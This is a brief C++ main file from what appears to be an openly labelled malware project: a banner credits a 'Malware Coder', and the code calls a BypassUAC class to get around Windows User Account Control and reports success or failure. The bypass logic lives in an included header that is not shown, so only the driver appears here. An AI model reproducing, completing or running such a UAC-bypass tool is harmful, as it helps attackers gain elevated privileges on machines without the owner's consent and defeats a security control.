/*
##################################################
#                                                #
#         Malware Coder: Elliot Alderson         #
#                                                #
#   Github: https://github.com/ElliotAlderson51  #
#                                                #
##################################################
*/

#include "UAC.h"

int main()
{
    BypassUAC uac;
    
    if (uac.StartBypassUAC())
        std::cout << "Start Bypass UAC SUCCESS!\n";
    else
        std::cout << "Start Bypass UAC FAILED!\n";

    return 0;
}

